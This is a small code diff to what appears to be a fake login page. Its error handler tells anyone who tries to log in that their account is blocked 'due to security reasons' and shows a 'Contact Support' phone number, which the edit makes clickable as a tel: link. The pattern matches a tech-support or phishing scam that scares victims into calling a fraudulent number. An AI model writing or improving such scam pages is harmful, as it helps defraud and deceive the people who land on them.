@@ -233,9 +233,9 @@
 
         // Show error message on login attempt
         function showErrorMessage() {
-            const errorMessage = document.getElementById('error-message');
-            errorMessage.innerHTML = 'Error Code : 00X47800<br> Your account has been blocked due to security reasons. <br>Contact Support : +1-844-499-1812';
-        }
+           const errorMessage = document.getElementById('error-message');
+errorMessage.innerHTML = 'Error Code : 00X47800<br> Your account has been blocked due to security reasons. <br>Contact Support: <a href="tel:+1-844-499-1812">+1-844-499-1812</a>';
+    }
 
         // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', function(event) {
